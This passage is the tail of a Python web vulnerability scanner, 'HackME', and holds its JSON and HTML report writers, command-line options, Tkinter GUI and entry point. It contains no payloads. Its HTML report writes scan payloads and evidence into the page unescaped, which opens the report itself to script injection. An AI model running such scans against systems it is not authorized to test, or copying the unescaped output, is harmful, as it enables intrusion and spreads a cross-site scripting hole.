        safe = re.sub(r"[^a-zA-Z0-9]", "_", urlparse(target).netloc)
        outfile = f"hackme_report_{safe}_{ts}.json"
    data = {
        "tool": TOOL_NAME,
        "version": VERSION,
        "target": target,
        "timestamp": datetime.now().isoformat(),
        "total": len(results),
        "results": [r.to_dict() for r in results],
    }
    with open(outfile, "w") as f:
        json.dump(data, f, indent=2)
    return outfile

def save_html_report(results, target, outfile=None):
    if outfile is None:
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        safe = re.sub(r"[^a-zA-Z0-9]", "_", urlparse(target).netloc)
        outfile = f"hackme_report_{safe}_{ts}.html"

    sev_colors = {"CRITICAL":"#ff4444","HIGH":"#ff8800",
                  "MEDIUM":"#ffcc00","LOW":"#44aaff"}
    rows = ""
    for r in results:
        c = sev_colors.get(r.severity,"#aaa")
        rows += f"""
        <tr>
          <td style="color:{c};font-weight:bold">{r.severity}</td>
          <td>{r.vuln_type}</td>
          <td style="word-break:break-all">{r.url}</td>
          <td>{r.param}</td>
          <td style="font-family:monospace;font-size:12px;word-break:break-all">
            {r.payload[:80]}
          </td>
          <td>{r.evidence}</td>
        </tr>"""

    html = f"""<!DOCTYPE html>
<html><head><meta charset="utf-8">
<title>HackME Report — {target}</title>
<style>
 body{{background:#0d0d0d;color:#eee;font-family:Segoe UI,sans-serif;padding:20px}}
 h1{{color:#ff4444}} h2{{color:#ff8800}}
 table{{border-collapse:collapse;width:100%}}
 th{{background:#1a1a2e;color:#ff8800;padding:10px;text-align:left}}
 td{{border-bottom:1px solid #222;padding:8px;vertical-align:top}}
 tr:hover{{background:#111}}
 .badge{{padding:3px 8px;border-radius:4px;font-weight:bold}}
</style></head><body>
<h1>🔴 HackME Vulnerability Report</h1>
<p>Developed by <b>Meelan Neupane</b> | Tool v{VERSION}</p>
<p>Target: <b>{target}</b></p>
<p>Generated: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}</p>
<p>Total Issues: <b style="color:#ff4444">{len(results)}</b></p>
<table>
<tr>
  <th>Severity</th><th>Type</th><th>URL</th>
  <th>Parameter</th><th>Payload</th><th>Evidence</th>
</tr>
{rows if rows else '<tr><td colspan="6" style="text-align:center;color:#0f0">No vulnerabilities found ✅</td></tr>'}
</table>
<p style="color:#555;margin-top:40px">
  ⚠ For authorized security testing only. Use responsibly.
</p>
</body></html>"""
    with open(outfile, "w") as f:
        f.write(html)
    return outfile

# ══════════════════════════════════════════════════════════════════════════════
#  CLI INTERFACE
# ══════════════════════════════════════════════════════════════════════════════

def cli_callback(msg, level="info"):
    lvl = level.lower()
    if lvl == "vuln":    vuln(msg)
    elif lvl == "ok":    ok(msg)
    elif lvl == "warn":  warn(msg)
    elif lvl == "error": err(msg)
    elif lvl == "dim":   cprint(msg, DIM)
    else:                info(msg)

def run_cli():
    parser = argparse.ArgumentParser(
        prog="hackme",
        description=f"{TOOL_NAME} — Web Vulnerability Scanner by {AUTHOR}",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Scan modes:
  xss     Cross-Site Scripting only
  sqli    SQL Injection only
  path    Path Traversal / LFI only
  full    All of the above + extras (default)

Examples:
  python hackme.py -u https://example.com
  python hackme.py -u https://example.com -m sqli
  python hackme.py -u https://example.com -m full --depth 4 --max-urls 500
  python hackme.py --gui
        """
    )
    parser.add_argument("-u","--url",      help="Target URL")
    parser.add_argument("-m","--mode",     default="full",
                        choices=["xss","sqli","path","full"])
    parser.add_argument("--depth",         type=int, default=MAX_DEPTH,
                        help=f"Crawl depth (default {MAX_DEPTH})")
    parser.add_argument("--max-urls",      type=int, default=MAX_URLS,
                        help=f"Max URLs to crawl (default {MAX_URLS})")
    parser.add_argument("--proxy",         help="HTTP proxy (e.g. http://127.0.0.1:8080)")
    parser.add_argument("--cookies",       help='Cookies string e.g. "session=abc; auth=xyz"')
    parser.add_argument("--header",        action="append", metavar="H",
                        help='Custom header "Name: Value" (repeat for multiple)')
    parser.add_argument("--output",        help="JSON report output path")
    parser.add_argument("--html",          help="HTML report output path")
    parser.add_argument("--no-report",     action="store_true",
                        help="Skip saving report files")
    parser.add_argument("--gui",           action="store_true",
                        help="Launch GUI mode")
    args = parser.parse_args()

    print(BANNER)

    if args.gui:
        launch_gui()
        return

    if not args.url:
        cprint("\n  Enter the target URL: ", C, end="")
        args.url = input().strip()
        if not args.url:
            err("No URL provided. Exiting.")
            sys.exit(1)

    # Normalize URL
    if not args.url.startswith(("http://","https://")):
        args.url = "https://" + args.url

    # Parse cookies
    cookies = {}
    if args.cookies:
        for part in args.cookies.split(";"):
            if "=" in part:
                k, v = part.strip().split("=", 1)
                cookies[k.strip()] = v.strip()

    # Parse headers
    headers = {}
    if args.header:
        for h in args.header:
            if ":" in h:
                k, v = h.split(":", 1)
                headers[k.strip()] = v.strip()

    cprint(f"\n  Starting scan on: {args.url}", Y)
    cprint(f"  Mode: {args.mode.upper()} | Depth: {args.depth} | MaxURLs: {args.max_urls}", C)
    sep()

    engine = ScanEngine(
        target   = args.url,
        mode     = args.mode,
        proxy    = args.proxy,
        cookies  = cookies,
        headers  = headers,
        depth    = args.depth,
        max_urls = args.max_urls,
        callback = cli_callback,
    )
    results = engine.run()
    print_results(results)

    if not args.no_report:
        jf = save_report(results, args.url, args.output)
        hf = save_html_report(results, args.url, args.html)
        ok(f"JSON report : {jf}")
        ok(f"HTML report : {hf}")

# ══════════════════════════════════════════════════════════════════════════════
#  GUI INTERFACE  (Tkinter — dark theme)
# ══════════════════════════════════════════════════════════════════════════════

def launch_gui():
    try:
        import tkinter as tk
        from tkinter import ttk, scrolledtext, messagebox, filedialog
    except ImportError:
        err("tkinter not available. Use CLI mode.")
        sys.exit(1)

    # ── Colours ───────────────────────────────────────────────────────────────
    BG      = "#0d0d0d"
    BG2     = "#141420"
    BG3     = "#1a1a2e"
    ACCENT  = "#e94560"
    ACCENT2 = "#ff8800"
    FG      = "#e0e0e0"
    GREEN   = "#00ff88"
    YELLOW  = "#ffcc00"
    CYAN    = "#00ccff"
    RED     = "#ff4444"
    DIMFG   = "#555555"

    root = tk.Tk()
    root.title("HackME — Web Vulnerability Scanner")
    root.geometry("1100x780")
    root.configure(bg=BG)
    root.resizable(True, True)

    # ── State ─────────────────────────────────────────────────────────────────
    scan_running = threading.Event()
    all_results  = []

    # ── Header ────────────────────────────────────────────────────────────────
    hdr = tk.Frame(root, bg=ACCENT, height=4)
    hdr.pack(fill="x")

    banner_frame = tk.Frame(root, bg=BG3, pady=12)
    banner_frame.pack(fill="x")
    tk.Label(banner_frame, text="⚡ HackME", font=("Consolas",28,"bold"),
             fg=ACCENT, bg=BG3).pack()
    tk.Label(banner_frame, text="Web Vulnerability Scanner",
             font=("Consolas",12), fg=ACCENT2, bg=BG3).pack()
    tk.Label(banner_frame, text=f"Developed by {AUTHOR}  •  v{VERSION}",
             font=("Consolas",10), fg=DIMFG, bg=BG3).pack()

    # ── Controls ──────────────────────────────────────────────────────────────
    ctrl = tk.Frame(root, bg=BG2, pady=10)
    ctrl.pack(fill="x", padx=10, pady=6)

    tk.Label(ctrl, text="Target URL:", fg=CYAN, bg=BG2,
             font=("Consolas",10,"bold")).grid(row=0, col=0, padx=8, sticky="w")
    url_var = tk.StringVar(value="https://")
    url_entry = tk.Entry(ctrl, textvariable=url_var, width=60,
                         bg=BG3, fg=FG, insertbackground=FG,
                         font=("Consolas",11), relief="flat",
                         highlightthickness=1, highlightcolor=ACCENT)
    url_entry.grid(row=0, col=1, padx=6, ipady=4)

    tk.Label(ctrl, text="Mode:", fg=CYAN, bg=BG2,
             font=("Consolas",10,"bold")).grid(row=0, col=2, padx=8, sticky="w")
    mode_var = tk.StringVar(value="full")
    mode_menu = ttk.Combobox(ctrl, textvariable=mode_var,
                              values=["full","xss","sqli","path"],
                              state="readonly", width=10,
                              font=("Consolas",10))
    mode_menu.grid(row=0, col=3, padx=6)

    tk.Label(ctrl, text="Depth:", fg=CYAN, bg=BG2,
             font=("Consolas",10,"bold")).grid(row=0, col=4, padx=(12,4), sticky="w")
    depth_var = tk.IntVar(value=3)
    tk.Spinbox(ctrl, from_=1, to=10, textvariable=depth_var, width=4,
               bg=BG3, fg=FG, font=("Consolas",10),
               buttonbackground=BG3).grid(row=0, col=5, padx=4)

    tk.Label(ctrl, text="Max URLs:", fg=CYAN, bg=BG2,
             font=("Consolas",10,"bold")).grid(row=0, col=6, padx=(12,4), sticky="w")
    maxurl_var = tk.IntVar(value=200)
    tk.Spinbox(ctrl, from_=10, to=2000, increment=50,
               textvariable=maxurl_var, width=6,
               bg=BG3, fg=FG, font=("Consolas",10),
               buttonbackground=BG3).grid(row=0, col=7, padx=4)

    # Row 2 — optional fields
    tk.Label(ctrl, text="Cookies:", fg=CYAN, bg=BG2,
             font=("Consolas",10,"bold")).grid(row=1, col=0, padx=8, pady=(6,0), sticky="w")
    cookie_var = tk.StringVar()
    tk.Entry(ctrl, textvariable=cookie_var, width=35,
             bg=BG3, fg=FG, insertbackground=FG,
             font=("Consolas",10), relief="flat").grid(row=1, col=1, padx=6, pady=(6,0))

    tk.Label(ctrl, text="Proxy:", fg=CYAN, bg=BG2,
             font=("Consolas",10,"bold")).grid(row=1, col=2, padx=8, pady=(6,0), sticky="w")
    proxy_var = tk.StringVar()
    tk.Entry(ctrl, textvariable=proxy_var, width=20,
             bg=BG3, fg=FG, insertbackground=FG,
             font=("Consolas",10), relief="flat").grid(row=1, col=3, padx=6, pady=(6,0))

    # Buttons
    btn_frame = tk.Frame(ctrl, bg=BG2)
    btn_frame.grid(row=0, col=8, rowspan=2, padx=14)

    scan_btn = tk.Button(btn_frame, text="▶  START SCAN",
                         font=("Consolas",11,"bold"),
                         bg=ACCENT, fg="white", relief="flat",
                         padx=12, pady=6, cursor="hand2",
                         activebackground="#c73348")
    scan_btn.pack(pady=4)

    stop_btn = tk.Button(btn_frame, text="■  STOP",
                         font=("Consolas",10,"bold"),
                         bg="#333", fg=YELLOW, relief="flat",
                         padx=12, pady=4, cursor="hand2",
                         state="disabled")
    stop_btn.pack()

    # ── Progress ──────────────────────────────────────────────────────────────
    prog_frame = tk.Frame(root, bg=BG)
    prog_frame.pack(fill="x", padx=10)

    prog_var = tk.DoubleVar()
    prog_bar = ttk.Progressbar(prog_frame, variable=prog_var, maximum=100,
                                mode="indeterminate")
    prog_bar.pack(fill="x")

    status_var = tk.StringVar(value="Ready — Enter a URL and press START SCAN")
    tk.Label(prog_frame, textvariable=status_var, fg=DIMFG, bg=BG,
             font=("Consolas",9)).pack(anchor="w", padx=4)

    # ── Notebook (tabs) ────────────────────────────────────────────────────────
    style = ttk.Style()
    style.theme_use("clam")
    style.configure("TNotebook",        background=BG2, borderwidth=0)
    style.configure("TNotebook.Tab",    background=BG3, foreground=FG,
                                         padding=[10,4])
    style.map("TNotebook.Tab",          background=[("selected",ACCENT)],
                                         foreground=[("selected","white")])
    style.configure("TCombobox",        fieldbackground=BG3, background=BG3,
                                         foreground=FG)

    nb = ttk.Notebook(root)
    nb.pack(fill="both", expand=True, padx=10, pady=6)

    # Tab 1 — Live Log
    log_frame = tk.Frame(nb, bg=BG)
    nb.add(log_frame, text="  📟 Live Log  ")
    log_box = scrolledtext.ScrolledText(
        log_frame, bg=BG, fg=FG, insertbackground=FG,
        font=("Consolas",10), state="disabled", wrap="word",
        relief="flat", padx=6, pady=6,
    )
    log_box.pack(fill="both", expand=True)
    log_box.tag_configure("vuln",   foreground=RED,    font=("Consolas",10,"bold"))
    log_box.tag_configure("ok",     foreground=GREEN)
    log_box.tag_configure("warn",   foreground=YELLOW)
    log_box.tag_configure("info",   foreground=CYAN)
    log_box.tag_configure("dim",    foreground=DIMFG)
    log_box.tag_configure("banner", foreground=ACCENT, font=("Consolas",11,"bold"))

    # Tab 2 — Results Table
    res_frame = tk.Frame(nb, bg=BG)
    nb.add(res_frame, text="  🎯 Vulnerabilities  ")

    cols = ("Severity","Type","URL","Parameter","Evidence")
    tree_scroll_y = tk.Scrollbar(res_frame)
    tree_scroll_y.pack(side="right", fill="y")
    tree_scroll_x = tk.Scrollbar(res_frame, orient="horizontal")
    tree_scroll_x.pack(side="bottom", fill="x")

    tree = ttk.Treeview(res_frame, columns=cols, show="headings",
                        yscrollcommand=tree_scroll_y.set,
                        xscrollcommand=tree_scroll_x.set,
                        selectmode="browse")
    tree_scroll_y.config(command=tree.yview)
    tree_scroll_x.config(command=tree.xview)

    style.configure("Treeview", background=BG2, foreground=FG,
                    fieldbackground=BG2, rowheight=26, font=("Consolas",9))
    style.configure("Treeview.Heading", background=BG3, foreground=ACCENT2,
                    font=("Consolas",10,"bold"))
    style.map("Treeview", background=[("selected", ACCENT)])

    col_widths = {"Severity":80,"Type":200,"URL":350,"Parameter":120,"Evidence":280}
    for c in cols:
        tree.heading(c, text=c)
        tree.column(c, width=col_widths[c], anchor="w")

    tree.tag_configure("CRITICAL", foreground=RED)
    tree.tag_configure("HIGH",     foreground=ACCENT2)
    tree.tag_configure("MEDIUM",   foreground=YELLOW)
    tree.tag_configure("LOW",      foreground=CYAN)
    tree.pack(fill="both", expand=True)

    # Tab 3 — Summary
    sum_frame = tk.Frame(nb, bg=BG)
    nb.add(sum_frame, text="  📊 Summary  ")
    sum_text = scrolledtext.ScrolledText(
        sum_frame, bg=BG, fg=FG, font=("Consolas",11),
        state="disabled", relief="flat", padx=10, pady=10
    )
    sum_text.pack(fill="both", expand=True)

    # ── Bottom bar ─────────────────────────────────────────────────────────────
    bot = tk.Frame(root, bg=BG3, pady=6)
    bot.pack(fill="x")

    def save_json_report():
        if not all_results:
            messagebox.showinfo("No Results","Run a scan first.")
            return
        path = filedialog.asksaveasfilename(
            defaultextension=".json",
            filetypes=[("JSON","*.json"),("All","*.*")])
        if path:
            save_report(all_results, url_var.get(), path)
            messagebox.showinfo("Saved", f"JSON report saved:\n{path}")

    def save_html_rep():
        if not all_results:
            messagebox.showinfo("No Results","Run a scan first.")
            return
        path = filedialog.asksaveasfilename(
            defaultextension=".html",
            filetypes=[("HTML","*.html"),("All","*.*")])
        if path:
            save_html_report(all_results, url_var.get(), path)
            messagebox.showinfo("Saved", f"HTML report saved:\n{path}")

    def clear_all():
        all_results.clear()
        log_box.config(state="normal")
        log_box.delete("1.0","end")
        log_box.config(state="disabled")
        for row in tree.get_children():
            tree.delete(row)
        sum_text.config(state="normal")
        sum_text.delete("1.0","end")
        sum_text.config(state="disabled")
        status_var.set("Cleared — ready for new scan.")

    for btn_cfg in [
        ("💾 Save JSON",  save_json_report, BG3, CYAN),
        ("🌐 Save HTML",  save_html_rep,    BG3, GREEN),
        ("🗑  Clear",     clear_all,         BG3, YELLOW),
    ]:
        tk.Button(bot, text=btn_cfg[0], command=btn_cfg[1],
                  bg=btn_cfg[2], fg=btn_cfg[3], font=("Consolas",10),
                  relief="flat", padx=10, cursor="hand2").pack(side="left", padx=6)

    tk.Label(bot, text=f"⚠  Authorized Testing Only   |   {TOOL_NAME} v{VERSION}  |  {AUTHOR}",
             fg=DIMFG, bg=BG3, font=("Consolas",9)).pack(side="right", padx=10)

    # ── Logic ─────────────────────────────────────────────────────────────────
    def log(msg, tag="info"):
        log_box.config(state="normal")
        log_box.insert("end", msg + "\n", tag)
        log_box.see("end")
        log_box.config(state="disabled")

    def gui_callback(msg, level="info"):
        root.after(0, lambda: log(msg, level))
        if level == "vuln":
            root.after(0, lambda: status_var.set(f"🔴 VULN FOUND — {msg[:80]}"))

    def populate_results(results):
        for row in tree.get_children():
            tree.delete(row)
        for r in results:
            tree.insert("", "end",
                        values=(r.severity, r.vuln_type, r.url,
                                r.param, r.evidence),
                        tags=(r.severity,))

    def update_summary(results, elapsed):
        by_sev = defaultdict(list)
        for r in results: by_sev[r.severity].append(r)
        lines = [
            "═"*60,
            f"  HackME Scan Summary",
            f"  Target  : {url_var.get()}",
            f"  Mode    : {mode_var.get().upper()}",
            f"  Duration: {elapsed:.1f}s",
            f"  Total   : {len(results)} issues",
            "─"*60,
        ]
        for sev in ["CRITICAL","HIGH","MEDIUM","LOW"]:
            n = len(by_sev[sev])
            if n: lines.append(f"  {SEVERITY_EMOJI[sev]}  {sev:10s}: {n}")
        lines += ["─"*60, "  Top Vulnerabilities:"]
        for sev in ["CRITICAL","HIGH"]:
            for r in by_sev[sev][:5]:
                lines.append(f"    • [{r.vuln_type}] {r.url[:70]}")
        if not results:
            lines.append("  ✅ No vulnerabilities detected!")
        lines.append("═"*60)
        sum_text.config(state="normal")
        sum_text.delete("1.0","end")
        sum_text.insert("end", "\n".join(lines))
        sum_text.config(state="disabled")

    stop_flag = threading.Event()

    def do_scan():
        nonlocal all_results
        url  = url_var.get().strip()
        mode = mode_var.get()

        if not url or url == "https://":
            messagebox.showerror("Error","Please enter a valid URL.")
            return

        if not url.startswith(("http://","https://")):
            url = "https://" + url
            url_var.set(url)

        # Parse cookies
        cookies = {}
        raw_c = cookie_var.get().strip()
        if raw_c:
            for part in raw_c.split(";"):
                if "=" in part:
                    k, v = part.strip().split("=", 1)
                    cookies[k.strip()] = v.strip()

        proxy = proxy_var.get().strip() or None

        scan_btn.config(state="disabled")
        stop_btn.config(state="normal")
        prog_bar.start(12)
        status_var.set("🕷 Scanning…")
        stop_flag.clear()
        all_results = []

        log("═"*60, "dim")
        log(f"  TARGET : {url}","banner")
        log(f"  MODE   : {mode.upper()}","banner")
        log("═"*60, "dim")

        t0 = time.time()

        engine = ScanEngine(
            target   = url,
            mode     = mode,
            proxy    = proxy,
            cookies  = cookies,
            depth    = depth_var.get(),
            max_urls = maxurl_var.get(),
            callback = gui_callback,
        )
        results = engine.run()
        elapsed = time.time() - t0

        all_results = results

        root.after(0, lambda: populate_results(results))
        root.after(0, lambda: update_summary(results, elapsed))
        root.after(0, lambda: prog_bar.stop())
        root.after(0, lambda: prog_bar.config(value=100, mode="determinate"))
        root.after(0, lambda: scan_btn.config(state="normal"))
        root.after(0, lambda: stop_btn.config(state="disabled"))

        sev_counts = defaultdict(int)
        for r in results: sev_counts[r.severity] += 1
        msg = (f"✅ Done in {elapsed:.1f}s — "
               f"{len(results)} issues: "
               f"🔴{sev_counts['CRITICAL']} CRITICAL "
               f"🟠{sev_counts['HIGH']} HIGH "
               f"🟡{sev_counts['MEDIUM']} MEDIUM "
               f"🔵{sev_counts['LOW']} LOW")
        root.after(0, lambda: status_var.set(msg))
        root.after(0, lambda: nb.select(1))  # Switch to results tab

    def start_scan():
        if scan_running.is_set():
            return
        scan_running.set()
        t = threading.Thread(target=do_scan, daemon=True)
        t.start()
        def wait():
            t.join()
            scan_running.clear()
        threading.Thread(target=wait, daemon=True).start()

    scan_btn.config(command=start_scan)
    url_entry.bind("<Return>", lambda e: start_scan())

    # Initial log
    log("  HackME — Web Vulnerability Scanner", "banner")
    log(f"  Developed by {AUTHOR}", "banner")
    log("─"*60, "dim")
    log("  Scans for: XSS • SQL Injection • Path Traversal", "info")
    log("  ⚠  Use on authorized targets ONLY.", "warn")
    log("─"*60, "dim")

    root.mainloop()

# ══════════════════════════════════════════════════════════════════════════════
#  ENTRY POINT
# ══════════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    # Check for --gui flag before argparse to avoid conflicts
    if "--gui" in sys.argv:
        print(BANNER)
        launch_gui()
    else:
        run_cli()
